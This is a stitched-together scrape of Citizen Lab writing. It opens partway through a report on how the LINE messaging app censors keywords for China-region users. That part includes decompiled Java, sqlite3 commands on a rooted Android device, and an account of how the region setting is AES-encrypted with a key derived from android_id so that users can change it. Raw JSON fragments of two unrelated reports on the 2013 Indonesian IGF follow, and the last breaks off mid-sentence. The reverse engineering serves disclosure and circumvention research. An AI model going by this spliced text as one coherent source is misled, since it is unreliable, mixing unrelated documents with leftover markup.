v3.4.2:\n5mxphvUu6sGOrG+Qw8EsqlMmx+kNh11mTfMLXZgNmxLfH4grWErsAEsqw+j34zUbdxDUiitSMr77CBwBdEojcKjIHvdBPtRFduMb5TgvBjbtzmlXHN+UmUsDVmto7rMdCwP6+/AEzLmKB6GsAEs+3Q8xEtejCqdMnuU262feg4m5OrNxlgX3wpifO/+9Q9lm4KzHAhs7ZSGCOZbE2j6wPOTTMA6TXh9G1gA560ZjGNu+tLPJStUd08Kkw+AQvLl3ZSC3CexDT83D+FK1MYAUmfc6BIGh/AalsSszJcLyatT7hRUpeNl0/3i+0z2vtEZxEO6SU4mempEnR9ErjGWLpUIbNdWxFVf32Le1UaLE000+fL0y06lopoFyGIjELHg+dbtmGFRMpxhmZauEFmkIeElCVctonsX1866+c3qXVfDnXZg30BXb9Octrytti5C81/P9M0yDrbtDod2IKX1k39IDrsdqTPUC3+TYyuAOACGnAN/FNkRQmeBbhzpY7Du2+F2fLm8QlFhm2MczaHyj9aDjMfUAEukNDtYi+Jj3MS+h8/F9FW3gMHjneviLWBBe0fRJBbrxRvUKDtvS6vrMO/J2+nxiz/3dBgkG2kXFR6Y9PfV7X0fmBW/ZZLM3MMUk8LMmAJIuhcaiKhaHg4721pXqT7v7U2FmHLLiKJIev4a0lG+bxg9nM2m9IcDRSq7Uca08JefErOSSUOWUoeWhNTtr1dhu07HgbhBaHxdHvurl9Ld+FHiKrJZNbZEnuNK5+xOrmBVemDc8untuB5IhotpDU3yAnZNmvZSDJ00/PH05jOCbf4SgW+rkVOjsgodSpljGar7OBSfGR+hMujN4gay3hHm9Ygg5zN8LlME31CcADlFRCixo0p3b3VxMlAvBHSRItE/B/QwxKsG/IY7y2LCu6wJrctgfPYW/px2ItSOnd4LtztEpCBhQT3/CZbO6c0OLWaDPufjnZYuyEXyA6677+aMcIAA0RpInRMmzwYg7eG4PnuygTgDWhm6mc5C8Raz2teUysHhsIP26WAjdBQ+IPWgRvKLDzgpKaOI+moYqXarkTRBBdtMEOp4d4+sU953rE4i8sWtVHSzpV9sprJ5FgdayGOleKnZoy9GX1l38ey983hX8+LnMsyVKpjw8I9NWCFdknigP9QvAAYaDAqE0g4Y0oD3G1YAikkHCV0Foc8lUww++9XpECxlED7znaF9USMeXV+ZyzRjztUk/kg==\nFor a decrypted version of this list, see [here].\nThe bad words check is only performed if the region stored in LINE’s settings is “CN”:\n\npublic static final boolean c()\r\n  {\r\n    add.a();\r\n    if (add.c());\r\n    String str;\r\n    do\r\n    {\r\n      return true;\r\n      add.a();\r\n      if (jl.d(add.a(cya.a)))\r\n        return false;\r\n      af localaf = b();\r\n      if (localaf == null)\r\n        break;\r\n      str = localaf.c();\r\n    }\r\n    while ((jl.d(str)) && (\nLocale.CHINA.getCountry().equalsIgnoreCase(str)\n)); return false; }\n\nUsers in other regions are not subject to censorship, and changing the region code from CN to any other region should prevent the censorship functions from being invoked.\nChanging Regions\nThe LINE installation’s region is stored in a SQLite database on the Android device, in the file /data/data/jp.naver.line.android/databases/naver_line.\nTo access the database, the Android device must be rooted. The database can be opened using either a SQLite GUI program such as SQLite Editor, or by using the command line program sqlite3 from a shell on the Android device. This example uses the command line program, which is preinstalled on many Android devices.\nListing the tables shows the type of information stored in the database:\n\nroot@android:/data/data/jp.naver.line.android/databases # sqlite3 naver_line\r\nSQLite version 3.7.16 2013-03-18 11:39:23 [www.ptsoft.org] [www.ptdave.com]\r\nEnter \".help\" for instructions\r\nEnter SQL statements terminated with a \";\"\r\nsqlite> .tables\r\nandroid_metadata       contacts               permanent_tasks      \r\nbuddy_detail           email_recommend        push_history         \r\nchannel                esk_history            setting              \r\nchat                   groups                 sns_friends          \r\nchat_history           membership             sticker              \r\nchat_member            more_menu_item_status  sticker_package      \r\nchat_notification      noti_center            version\n\nThe database setting contains the region as well as other user account details. One interesting thing to note is that some of these values are Base642 encoded:\n\nPROFILE_NAME|lUrTpRKtKUwg8riwl6b5Dw==\r\nPROFILE_REGION|TnPF6Y1PAAuVhWt17IMRtA==\r\nPROFILE_COUNTRY_CALLING_CODE|2BP0qhgFrPzM0qPSibkoKw==\r\nPROFILE_PHONE|kE/KhY6QGb/B2yuqPoQn3i==\r\nPROFILE_NORMALIZED_PHONE|+wJ7t10qbHqR5yRezaJd0c==\n\nThis change is a recent development: as of mid-2012, users were changing their region in order to download free stickers and in-app enhancements only available in other areas. Two examples of this can be found here and here. Compare the Base64 values above to a screenshot of the database from a blog post on July 25, 2012:\n\nSource: Frank’s Blog\nWhen unencoded, these settings do not show up as the expected plaintext; the reason they are Base64 encoded is not just for obfuscation, but also to convert encrypted binary data into printable characters. It is likely that the region is stored encrypted to prevent people from changing their region to have access to more downloadable content.\nFor example, decoding PROFILE_REGION gives 16 bytes of binary data:\n00000000  26 c8 9b 97 37 68 d1 8c  83 42 43 f5 84 f2 83 0c  |&...7h...BC.....|\nBy looking through the decompiled binary, we can see that this data is encrypted. Like the bad words file, it uses AES, but with slightly different options.\nUnlike the static key used for the bad words file, the settings are encrypted using a key derived from the android_id value of the phone. More information on this value can be found here, and the value can be determined using a program such as Android Id Info.\n\npublic final byte[] generateKey(long magicNumber)\r\n  {\nString str = Settings.Secure.getString(f.c().getApplicationContext().getContentResolver(), “android_id”);\nif (str == null) str = “”; int i = str.hashCode();\nreturn generateKeyFromHash((byte)i, magicNumber);\n}\n\nThis function generates the AES decryption key by taking the android_id identifier, hashing it using a standard Java function, then applying another transformation algorithm to it to derive the key. The magicNumber value is hardcoded into the program and is equal to 15485863.\nAES decryption is performed in electronic codebook (ECB) mode with no padding:\n\npublic static byte[] decrypt(byte[] key, byte[] ciphertext)\r\n  {\r\n    SecretKeySpec sk = new SecretKeySpec(key, \"AES\");\r\n    Security.addProvider(new BouncyCastleProvider());\r\n    try {\nCipher c = Cipher.getInstance(“AES”, new BouncyCastleProvider());\nc.init(Cipher.DECRYPT_MODE, sk); return c.doFinal(ciphertext); }\n\nUsing our example from above, we can decrypt the string to determine the region:\n\nyour region is   : CN\r\ndecrypted region = 43 4e\r\nencryption key   = 3b 93 dd 57 52 b8 38 7e 07 e8 b0 0f c3 f5 89 12\r\nencrypted region = 4e 73 c5 e9 8d 4f 00 0b 95 85 6b 75 ec 83 11 b4 \r\nencoded region   = TnPF6Y1PAAuVhWt17IMRtA==\n\nChanging the PROFILE_REGION value in the setting database to TnPF6Y1PAAuVhWt17IMRtA== will change the region to China. This change can be confirmed by looking at the terms of service or privacy information in the LINE application. It can also be confirmed by attempting to send a keyword from the bad words list:\n\nFigure 2: This screenshot shows a LINE user with region set to China receiving an error notification after attempting to send keywords on the blocked keyword list. This error message indicates client-side outbound keyword censorship is present in LINE. \nTo turn off censorship, we want to go in the reverse of the above example. On a China-region installation, changing the region code from CN to another region (e.g. CA or US) will disable censorship functions.To assist users we are releasing LINE Region Code Encrypter Tool developed by Seth Hardy and Greg Wiseman (Senior Data Visualization Developer, Citizen Lab) for changing regions in the LINE client to disable regionally-based keyword censorship in the application.\n\nUpdate – November 19th, 2013\nAn article by Kaylene Hong of TheNextWeb provides a response from LINE Corporation regarding the presence of regionally-based keyword censorship in their chat program: “A LINE spokesperson drew a clear line between Lianwo and Line, emphasizing that the Chinese version of LINE is different from the global version.” However, all of the censorship functionality described in this report is implemented in the global version of LINE, and it is unclear whether the Lianwo version of LINE has additional functionality or is merely rebranded.\nInbound Censorship\nIncoming messages in LINE are also subject to censorship when the region is set to China. The LINE client will replace any words found in bad word files (internal or downloaded) with asterisk characters. As with outbound messages, inbound censorship requires a strict match, and can be bypassed by adding spaces or other punctuation.\nOn a phone with LINE installed where the region is set to Canada, messages received which contain keywords on the censorship list come through properly:\n\nFigure 3: This screenshot shows a LINE user with region set to Canada successfully receiving two messages with keywords on the censored keyword list.\nBut if the application’s region is set to China, these words are blocked. The screen shot below shows that messages with the keyword “李洪林访谈录” (Li Honglin Interview) are replaced by a series of asterisks, but when the same keyword is sent with periods separating the individual characters the message is not blocked.\n\nFigure 4: This screenshot shows a LINE user with region set to China receiving messages with keywords on the censored keyword list as a series of asterisks.\nThis method of censorship is particularly problematic, because to the message sender, it appears as if the content was received properly:\n\nFigure 5: This screenshot shows the view of a LINE user with region set to Canada when sending censored keywords to a user with region set to China. From the Canada-based user’s point of view the messages appear to have been received and read by the China-based user. \nThe code that does incoming censorship is interesting. It uses a regular expression to match incoming messages against the bad words file(s), and replaces the characters individually with asterisks. However, because of how Android programs run, the code takes effect when the string is displayed in the main program, but not in notifications. This function allows the recipient to see the censored message in a preview notification:\n\nFigure 6: This screenshot shows a message preview notification for a LINE user with region set to China receiving a message with censored keywords.\nAbout The AuthorSeth Hardy is a Senior Security Analyst at the Citizen Lab, Munk School of Global Affairs, University of Toronto.

    "text": "\n\t\t\t\tIslands of Control, Islands of Resistance: Monitoring the 2013 Indonesian IGF\nDownload the full report here.\nRead the individual sections here:\n\nIGF 2013: Islands of Control, Islands of Resistance: Monitoring the 2013 Indonesian IGF (Foreword)\nIGF 2013: Monitoring Information Controls During the Bali IGF (Framing Post)\nIGF 2013: An Overview of Indonesian Internet Infrastructure and Governance (Part 1 of 4)\nIGF 2013: Analyzing Content Controls in Indonesia (Part 2 of 4)\nIGF 2013: Exploring Communications Surveillance in Indonesia (Part 3 of 4)\nIGF 2013: An Analysis of the 2013 IGF and the Future of Internet Governance in Indonesia (Part 4 of 4)\n\nThe Internet Governance Forum (IGF) brings various stakeholder groups together to discuss public policy issues related to the Internet. The 2013 IGF took place in Bali, Indonesia under the overarching theme of “Building Bridges: Enhancing Multistakeholder Cooperation for Growth and Sustainable Development.” For the country’s vibrant civil society, the IGF presented a range of stakeholders with an opportunity to raise awareness, mobilize support, and shape the agenda. Now that the forum has concluded, however, challenges remain in building a progressive Internet governance agenda that realizes the right to freedom of expression and information.\nA growing number of Indonesia’s 240 million people use the Internet daily, whether to get around, to communicate with friends, or to get involved in social campaigns. Indonesia is quickly becoming the “social media capital of the world.” The capital city of Jakarta is the most active Twitter city in the world and the country as a whole is the fourth most active on Facebook. The government, recognizing the importance of high-speed Internet to economic and social development, has committed to developing the country’s information and communications technology (ICT) infrastructure by launching the “Indonesia Connected” program to boost connectivity in border and remote areas. Along with this development, however, came an increase in government’s concern over online content. While multistakeholder groups have participated in the often-contentious debate over what online content should be filtered, by whom, under what processes, and according to which laws, their impact on policy-making is uncertain.\nAs our infrastructure and governance post discusses, Indonesia is currently drafting or revising a number of ICT-related laws that contain serious human rights implications. It is important, therefore, that elements maintaining respect for human rights are incorporated in the scope of these legislations. The Snowden revelations and a number of high-profile corruption cases in Indonesia have renewed calls for stricter regulations regarding wiretapping. The draft Law on Information Technology Criminal Offence (RUU Tindak Pidana Teknologi Informatika [TIPITI]) has raised concerns for being too broad and containing harsher penalties than the controversial Electronic Information and Transactions (EIT) Law (Undang-Undang Informasi dan Transaksi Elektronik). After much criticism, the government is currently revising the EIT law, particularly article 45 which specifies the penalty for defamation as up to six years’ imprisonment and fines of up to IDR 1 billion (approximately USD 106,000). The penalty has reportedly changed from six years to three, but the revision stopped short of decriminalizing defamation.\nThe Internet market in Indonesia is highly distributed and, as a consequence, the scope and depth of filtered content vary across over two hundred different ISPs. Recently, however, the Indonesian government has aimed toward more centralized systems. The independent Nawala Foundation provides a DNS server that enables service providers to block websites for pornography and gambling, among other categories. Its use is not compulsory for members of the Indonesian ISP Association (APJII), but it is encouraged. In addition, the Ministry of Communications and Information Technology (MCIT) maintains and endorses Trust+ Positif, a set of configuration files and block lists for the popular open source Squid HTTP proxy and the SquidGuard add-on, which is an open source implementation of URL access control lists for Squid. Trust+ Positif block lists include over 745,000 domain names and 55,000 URLs categorized as pornographic content. Because implementation has been inconsistent across service providers, the MCIT is preparing a draft Ministerial Decree on Controlling of Internet Websites with Negative Content (RPM Pengendalian Situs Internet Bermuatan Negatif) to establish a uniform mechanism and conditions for blocking and filtering.\nThe implementation of content control in Indonesia has been criticized for a number of reasons. Representatives from the APJII have warned that the costs associated with implementing content-filter systems are burdensome for smaller ISPs and could potentially slow down Internet traffic. Also, our research has found that there have been instances of “mission creep” where websites containing religious issues and religious advocacy groups, and content related to sexuality and gender (e.g., local LGBT community websites), among other content categories, are also blocked. Civil society has criticized government’s opaqueness and unresponsiveness to their concerns, especially with regard to the Trust+ Positif system (e.g., which legislation governs the blocking mechanism of illegal content and the use of tools such as Trust+ Positif. If a website containing no illegal web content is blocked, what is the remedy mechanism? Who will pay for the costs incurred for monitoring and screening websites?). These concerns are made all the more serious when citizens are “very much invited” to participate in content control by forwarding URLs to an e-mail address or filling out a submission form (at the time of publication, this form was “under development”).\nCivil Society’s Role in the 2013 IGF\nCivil society organizations play a key role in increasing awareness of citizens’ rights online. ICT Watch, one of our Cyber Stewards Network partners, as well as a number of other organizations such as Institute of Policy Research and Advocacy (ELSAM), Relawan TIK Indonesia (ICT Volunteers Indonesia), Center for Innovation Policy and Governance, and Hivos, launched the Indonesian CSO Network for Internet Governance (ID-CONFIG) in December 2012, which is a coalition of local civil society organizations (CSOs) that regularly dialogues on Internet governance issues. Under the banner of ID-CONFIG, civil society organizations participated actively in the 2013 IGF process. The steering and organizing committees, for instance, included ID-CONFIG, the government, and the private sector. During the event’s planning stages, the organizing committee faced delays in finalizing the host country agreement, as well as budgetary shortfalls (partially stemming from political turmoil following corruption allegations facing the Ministry of Communications and Information Technology), which threatened to see the event cancelled. The issue of funding for the 2013 meeting also sparked a more fundamental debate over how to fund the Internet Governance Forum generally. Following reports on social and news media that the Bali IGF would be cancelled due to a lack of funds, and a series of discussions on several mailing lists inquiring if this was really the case, the Chair of the IGF Multistakeholder Advisory Group (MAG) and former IGF Executive Secretary, Markus Kummer, maintained that “the UN has not received any official confirmation that Indonesia is withdrawing its offer to host the 2013 IGF” and that “cancelling the whole event is no option.” The group was eventually able to raise the funds, with domestic and international actors making financial contributions to cover the funding gap.\nThese different stakeholders coming together during the early stages of the event shaped how the 2013 IGF was constituted. The IGF has traditionally been a government-driven event because a substantial amount of funding is required to cover a host country’s responsibilities, such as paying for the meeting venue and participant transportation, as well as the travel, per diem, and at-home replacement costs of UN staff, among other expenses. But the lack of government support provided the space for business and civil society communities to step up their roles in the forum’s organization, and their influence could been seen throughout. For instance, in addition to fundraising for the event together, they suggested two overarching themes, “Internet Governance Towards Information Society through Multistakeholder Participation” and “Internet Governance to Achieve Sustainable Development through People’s Participation.” The theme that was adopted, “Building Bridges: Enhancing Multistakeholder Cooperation for Growth and Sustainable Development,” contained the key words “multistakeholder” and “sustainable development,” which were considered by these stakeholder groups as crucial components of Internet governance.\nCivil society formed an integral part of the 2013 IGF Secretariat, responsible for running the event, which meant that they were in charge of creating and maintaining the website and determining the distribution of resources among participants (e.g., nine booths were allocated to civil society versus seventeen in total for government and private sector representatives). The secretariat worked with the Penabulu Foundation, a Hivos partner organization, who introduced measures to ensure financial transparency and accountability, such as standard operating procedures for auditing and reporting. During the event, a number of workshops such as “Civil Society and Internet Governance: Multi-Stakeholder Engagement Practices from Southeast Asia and Beyond” and “Social Media for Social Movement: How Civil Society Can Optimize the Internet to Conduct Online Public Advocacy of Human Rights” were organized by civil society groups. The IGF pre-event, traditionally organized as a ministerial meeting, was broadened in scope and was referred to this year as the High-Level Leaders Meeting (HLLM). Over seventy civil society participants were invited to the HLLM, three of whom were speakers — including Citizen Lab’s Director Ron Deibert — compared to only two speakers each from government and the private sector. Indonesia’s Minister of Communications and Information Technology’s statement at the HLLM was drafted with input from civil society. Following the event’s conclusion, the 2013 IGF narrative report was drafted by civil society, including the Citizen Lab.\nCitizen Lab staff and associates have participated in every IGF since the first meeting was held in Athens in 2006, as well as the WSIS meetings that preceded it in 2003 and 2005. At the 2005 WSIS meeting in Tunis, Citizen Lab researcher Nart Villeneuve’s presentation on Internet filtering was disrupted by Tunisian authorities and nearly cancelled. Moreover, our participation in the 2009 IGF in Egypt included having the book launch for the OpenNet Initiative’s Access Controlled interrupted by United Nations’ officials, following complaints by Chinese government representatives concerning our reference to Tibet and the Great Firewall of China in our published material. In contrast, the Citizen Lab was able to participate freely and openly at the 2013 IGF, including hosting a press conference on the publication of a series of blog posts titled “Monitoring Information Controls During the Bali IGF,” which discuss at length Indonesia’s content filtering and surveillance regimes.\nLooking Forward\nThe IGF provided a springboard for Indonesian civil society organizations, working together with other stakeholder groups, to rally behind pressing Internet governance issues such as censorship and surveillance. The influence that civil society had on the 2013 IGF has been lauded as a model for how multistakeholder participation can operate at these events. We hope that the momentum of pushing for greater protection of the basic principles of human rights in Internet governance in Indonesia can be maintained, and that the multistakeholder process can be sustained well past the event.\nThe government is working toward building ICT infrastructure and services to connect the archipelagic country from Sabang to Merauke. Indonesia’s youthful population ensures that technologies like the Internet are being adopted quickly. By the end of 2013, Indonesia’s Internet penetration rate is expected to reach 33 percent, or roughly 80 million users. The business community’s role is crucial in ensuring that the growth in accessibility and Internet usage is achieved. For this development to happen, the country’s legal and regulatory framework must be consistent, greatly simplified, and harmonized to make it less burdensome and more transparent for business. These goals can be achieved by encouraging greater government accountability and transparency.\nIndonesia, as a founding member of the Open Government Partnership, has committed to a model of government that is “sustainably more transparent, more accountable, and more responsive to their own citizens.” The OGP pledge can be extended to the Internet governance sphere by the government’s collaboration with fellow stakeholders, such as businesses and civil society, when designing Internet-related policies, as well as creating mechanisms to facilitate and deepen this cooperation. For instance, while the government has held focus group discussions of early drafts of legislations, civil society has called for these discussions to be more transparent (e.g., recorded and made public), and for the government to ensure that relevant feedback is incorporated into the final drafts.\nOne of the more urgent concerns the Indonesian government faces is cybercrime, and the population is becoming even more aware of its impact. A recent Akamai report indicated that the number of cybercrime incidents in the country is growing significantly. It’s unsurprising, therefore, that Indonesia is involved in a number of regional initiatives to combat cybercrime. In 2011, the Association of Southeast Asian Nations (ASEAN) met in Bali to discuss transnational crime, recognizing that the organization should jointly combat cybercrime. The ASEAN Senior Officials Meeting on Transnational Crime met in Vietnam in 2013 to reconfirm its commitment to fighting crime in the region, and concluded with an endorsement for a working group on cybercrime. The Asia-Pacific Economic Cooperation (APEC), of which Indonesia is a member, is working to ensure cooperation on combatting cybercrime through the “Security and Prosperity Steering Group Experts Group on Cybercrime,” which is designed to “promote and improve cooperation among member economies in the fight against cybercrime.” Cybercrime issues are also expected to be discussed at the ninth World Trade Organization (WTO) Ministerial Conference to be held in Indonesia in December 2013. Commentators are urging the WTO to help global victims of cybercrime and economic cyber espionage through clear “guidelines and penalties.” Unless a balance is maintained between national security concerns and lawful procedures and oversight mechanisms, these initiatives run the risk of adversely affecting civil liberties and human rights.\nAs development continues apace, civil society has an important role to play in engaging the general public, government, and private sector to ensure that Indonesia’s Internet governance regime respects and protects basic principles of human rights. Achieving this balance requires constant monitoring and continuously reexamining policies and practices, and a proactive engagement with like-minded domestic and international stakeholders. With the impending establishment of the ASEAN Economic Community in 2015, it is expected that there will be more consolidated collaboration in the area of cybercrime and cyber security. Together with our colleagues in the region, we will be monitoring developments in the country’s Internet governance agenda closely and we support one that promotes democracy, human rights, transparency, and accountability.\n \n \n \n \n \n \n \n \n\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tIslands of Control, Islands of Resistance: Monitoring the 2013 Indonesian IGF\nTerjemahan dalam bahasa Indonesia dari halaman ini tersedia disini.\nDownload the full report here.\nRead the individual sections here:\n\nIGF 2013: Islands of Control, Islands of Resistance: Monitoring the 2013 Indonesian IGF (Foreword)\nIGF 2013: Monitoring Information Controls During the Bali IGF (Framing Post)\nIGF 2013: An Overview of Indonesian Internet Infrastructure and Governance (Part 1 of 4)\nIGF 2013: Analyzing Content Controls in Indonesia (Part 2 of 4)\nIGF 2013: Exploring Communications Surveillance in Indonesia (Part 3 of 4)\nIGF 2013: An Analysis of the 2013 IGF and the Future of Internet Governance in Indonesia (Part 4 of 4)\n\nIndonesia, an archipelagic country with a population of over 240 million people, is involved in many regional and international debates on integrating information and communication technology (ICT) in national development. As the largest economy in Southeast Asia, the country’s steps toward ICT development and regulation will have a significant influence on the trajectory of similar efforts in other countries within the region. This blog post seeks to map out the infrastructure and governance of ICTs in the country, and explores the trends and challenges regarding the right to freedom of expression and access to information that are grounded in the universal human rights framework.\nInternet penetration in Indonesia has increased since the beginning of the century from less than 1 percent in 2000 to just over 15 percent in 2011 (or roughly 45 million people). At the end of 2012, that figure was 10 million more, or equivalent to an increase of over 800,000 users every month. A predicted 80 million Indonesian users will be online by the end of 2013. This means that Internet penetration will grow to 33.3 percent. The value of the Internet in Indonesia, as calculated from the amount it will deliver to the gross domestic product (GDP), according to Deloitte Access Economics, is at 1.6 percent of GDP, bigger than liquefied natural gas exports, and it’s growing rapidly. Deloitte Access Economics expects it to grow at three times the pace of the economy, from 1.6 percent of GDP in 2010 to at least 2.5 percent of GDP over the next five years.\nCellular phone penetration has increased at an exponential rate over the same period, from 1.72 to 115.20 cellular phone subscriptions per 100 inhabitants (See Figure 1). A 2011 market report found that 48 percent of users connect to the Internet through mobile devices. Mobile phone subscription in Indonesia reached 290 million in 2012 because people frequently carry two or more devices. The Indonesian government aims to push mobile broadband penetration to 22 percent in 2013, higher than the 8 percent penetration target for fixed broadband.\n\nFigure 1. Indonesian Internet penetration and mobile subscriptions per 100 inhabitants\nIndonesia has over three hundred Internet service providers (ISPs), thirty-five of which own network infrastructure. PT Telkom is Indonesia’s largest telecommunications company, with 8.6 million fixed-wire-line customers, 14.2 million fixed-wireless customers, and 107 million cellular customers as of December 2012. PT Indosat is Indonesia’s second-largest cellular operator, with more than 55 million cellular subscribers. Both PT Telkom and PT Indosat were partially privatized in the mid-1990s. The government retains shares in both companies, including over 50 percent ownership in the case of PT Telkom.\nIn contrast to the agglomeration of ISPs, the growth of Indonesia’s media industry has led to a media oligopoly and the concentration of ownership in the hands of a small number of corporations. Twelve large conglomerates control nearly all of the country’s media channels, including broadcast, print, and online media. For instance, Berita Satu Media Holding, a new media company under the Lippo Group, has established an Internet-Protocol Television (IPTV) BeritasatuTV, online media channel www.beritasatu.com, and also owns a number of newspapers and magazines. A number of these media groups are owned by individuals involved in politics. For example, Aburizal Bakrie is both the chairman of Golkar, one of the country’s biggest political parties, and owner of Visi Media Asia (also known as VIVA), which owns TV stations such as ANTV, tvOne, Vivasky, and Sport One, as well as the online news website VIVA.co.id. Surya Paloh, the founder of a new political party, Nasional Demokrat (NasDem), is the owner of Media Group, which operates the MetroTV station and publishes the newspapers Media Indonesia, Lampung Post, and Borneonews, as well as the tabloid, Prioritas. Such monopoly in the media is made possible by the 2002 Broadcasting Law (Undang-undang Penyiaran), which sets vague limitations on private broadcasting ownership (and, as we will explain, the People’s Representative Council and the Indonesian government are currently drafting a revision to the Broadcasting Law). Ahead of the 2014 general elections, there are concerns that this “conglomeration” may affect the media’s independence.\nThe Ministry of Communication and Information Technology, recognizing the importance of high-speed Internet to economic and social development, launched the Indonesia Connected program to boost connectivity in border and remote areas. The fiber-optic Palapa Ring network is being implemented throughout Indonesia to accommodate this growth. The ministry estimates that construction of the Internet backbone has reached 80 percent, covering Nangroe Aceh Darussalam (Sumatera) Ring, Java-Kalimantan-Sulawesi-Denpasar-Mataram Ring, and Mataram-Kupang Ring. Several companies are involved in this project, including PT Telkom and PT Indosat. Recently, Lippo Group announced that it is partnering with JSAT, Japan’s largest telecommunications company, to increase Internet connectivity in Papua, specifically through the installation of VSAT (very small aperture terminal). The stretch from Manado (Sulawesi) to Papua (5,194 kilometres) will be connected to the fiber-optic network when the project is completed.\nThe Palapa Ring project contains 35,280 kilometres of undersea cable. Many of these cables connect to Singapore (see Figure 2), which sits at the crossroads between Asia Pacific and Europe and serves as a major hub for submarine cables used for Internet and telecommunications infrastructures. Citizen Lab’s partner organization, Privacy International, has conducted research on surveillance technology providers, whose systems include subsea cable-tapping technology. According to the Sydney Morning Herald (SMH), information disclosed by US whistleblower Edward Snowden revealed that the British Government Communications Headquarters (GCHQ) collects all data transmitted to and from the United Kingdom and Northern Europe via one of Indonesia’s submarine cables, the SEA-ME-WE-3, which is the longest optical submarine cable in the world with landing points in Medan and Jakarta, Indonesia. Australian intelligence sources also told Fairfax Media, which owns the SMH, that Singaporean intelligence cooperates with Australia in accessing and sharing communications carried by the cable.\n \n\nFigure 2. Currently active Indonesia-connected submarine cables (international and domestic)\n(Source / interactive version: http://submarinecablemap.com/#/country/indonesia)\nIndonesia does not have a centralized Internet infrastructure and has several links to overseas networks. The Indonesia Internet Exchange (IIX), the country’s first Internet exchange point (IXP), is maintained by the Association of Indonesian Internet Service Providers (APJII) (See Figure 3). The country’s second IXP, OpenIXP, is operated by the Indonesia Data Center (IDC). Indonesian government regulation mandates that Internet Service Providers (ISPs) must subscribe their IP transit from the network access provider (NAP) as global upstream. The IXPs, therefore, serve only local/domestic function between Indonesian ISPs.1\n\nFigure 3. The schema of the Indonesian Internet Industry according to IIX\nFigure 4 shows various Indonesian, as well as foreign, Autonomous Systems (ASes): networks that are under the administration of a particular entity or authority. The middle layer of nodes in the diagram (with both names and numbers) represents Indonesian networks that have upstream connectivity to foreign networks. The variety of networks and number of links to these foreign networks indicates a lack of centralization. This dispersed decentralized network may be what caused Renesys, an Internet intelligence provider, to classify Indonesia in 2012 as “likely to be extremely resilient to Internet disconnection.”\nFigure 4. International connectivity amongst Indonesian ASNs\nDespite its impressive growth and numerous small and large ISPs, Indonesia’s ICT development has lagged behind many of its regional neighbours’ ICT growth. For example, Malaysia’s Internet penetration rate was close to 66 percent in 2012, while the percentage of individuals using the Internet in Singapore was 74 percent in the same year. LIRNEasia, a regional think tank focusing on ICT policy and regulation in the Asia-Pacific region, places this technological development gap in the context of political instability and Indonesia’s economic stagnation during the Asian financial crisis of the late 1990s. LIRNEasia further names the limited use of English in Indonesia, a lack of access to telecommunication infrastructure in rural areas, the high cost of connectivity to the international backbone, and inadequate government regulation as contributing factors to Indonesia’s low ICT use. In addition, according to the Indonesian Internet Governance Forum (ID-IGF), the low level of bandwidth and computer penetration in Indonesia has contributed significantly to the challenge of increasing Internet penetration in the country.\nRegulatory Bodies\nMinisterial duties associated with the regulation of information technology fall under the auspices of the Ministry of Communication and Information Technology (MCIT).The ministry defines part of its function as the “formulation of national policy, policy implementation, and technical policies in the field of communication and informatics, including the postal, telecommunications, broadcasting, information technology and communications, multimedia services and the dissemination of information.” In 2005, the MCIT took control of the Directorate General of Post and Telecommunication (DGPT). According to its website, the DGPT has three functions:\nThe first function covers all general and operational aspects, which is implemented through licensing and other requirements. The second function covers all aspects of surveillance and scrutiny to make sure that posts and telecommunications are conducted within the legal framework, while the third function deals with supervision to the operators as well as enforcement of law regarding their operations.\nAnother key government department is the Indonesian Telecommunications Regulatory Body (Badan Regulasi Telekomunikasi Indonesia, BRTI). The BRTI is responsible for issuing licenses, resolving disputes, and advising government on telecommunication policy issues. However, its responsibilities vis-à-vis DGPT are not clearly defined. Although the BRTI was intended to be an independent regulator, the agency has been criticized for its lack of independence because it is chaired by the DGPT, which is part of MCIT.\nLaws and Regulations\nThe Indonesian Constitution (Undang Undang Dasar (UUD) 1945)\nThe 1945 constitution was amended four times between 1999 and 2002. Before these amendments, the constitution did not explicitly affirm human rights. For instance, articles 27 (1 and 2) and 28 asserted only the existence of the principle of equality before law, freedom of assembly, and freedom of speech. It was after the amendments were made that the constitution stipulates a number of articles that explicitly affirm human rights are honoured and guaranteed. Ten articles were incorporated into the constitution (articles 28A, 28B, 28C, 28D, 28E, 28F, 28G, 28H, 28I and 28J), proving that Indonesia has adopted the Universal Declaration of Human Rights (Deklarasi Universal tentang Hak Asasi Manusia).2\nDecree No. XVII/MPR/1998 and Law No. 39 of 1999 on Human Rights\nThis is how the Decree of the Consultative Assembly (TAP MPR) No. 17/MPR/1998 concerning human rights protects the right to freedom of expression:\n\nEveryone shall have the right to freedom to express his/her opinions and convictions based on their conscience (Article 14);\nEveryone shall have the right to freedom of association, assembly, and expression opinion (Article 19);\nEveryone shall have the right to communicate and receive information for his/her personal development and social environment (Article 20);\nEveryone shall have the right to seek, obtain, posses, keep, process, and convey information by utilising all kinds of available channels (Article 21); and\nThe right of citizens to communicate and obtain information is guaranteed and protected (Article 42).\n\nFurthermore, Indonesia adopted Law No. 39 of 1999 on Human Rights. The preamble to this law states that Indonesia, as a United Nations (UN) member state, has moral and legal responsibilities to honour and implement the Universal Declaration of Human Rights and other international instruments on human rights. The law also stipulates that everyone has the right to express his or her opinion in public (article 25).\nReligion\nReligion is a key factor affecting the regulation of freedom of expression in Indonesia. As the world’s largest majority Muslim country, the voices of those who believe in a more conservative brand of Islam have influenced discussions ranging from the social to political arenas and have given rise to strict legislation governing what’s considered acceptable content or speech.\nThe passing of laws with harsh, punitive legal measures, as outlined below, and the demand for telecommunication companies like BlackBerry and ISPs to filter out pornographic content are indicative of increasing pressure from conservative groups, and the lack of regard for the protection of the people’s right to freedom of expression and freedom of information, despite these rights being included in the Indonesian Constitution.\nPassing laws with harsh, punitive legal measures and demanding telecommunication companies like BlackBerry and ISPs to filter out pornographic content indicate increasing pressure from conservative groups, and the lack of protection of people’s right to freedom of expression and freedom of information, despite these rights being included in the Indonesian constitution.\nIndonesia’s free press, dynamic political process, and vibrant civil society have exerted pressure on the government to respect these rights (and will continue to), but there needs to be sustained international support to ensure that the government works in as transparent and accountable a manner as possible.3\nLaw No. 36 of 1999 on Telecommunications\nTelecommunications services in Indonesia used to be provided by a string of state-owned companies. But recent reforms have attempted to create a regulatory framework that promotes competition and accelerates the development of telecommunications facilities and infrastructure. The enactment of Law No. 36 of 1999 on Telecommunications, which replaced Law No. 3 of 1989 on Telecommunications, provided the framework for a major deregulation of the Indonesian telecommunications sector to unfold. These deregulation measures are reflected in its commitments under the WTO Agreement on Basic Telecommunications that entered into force in February 1998, which means that the country committed itself to review its current policy.\nThis law does not regulate e-commerce or 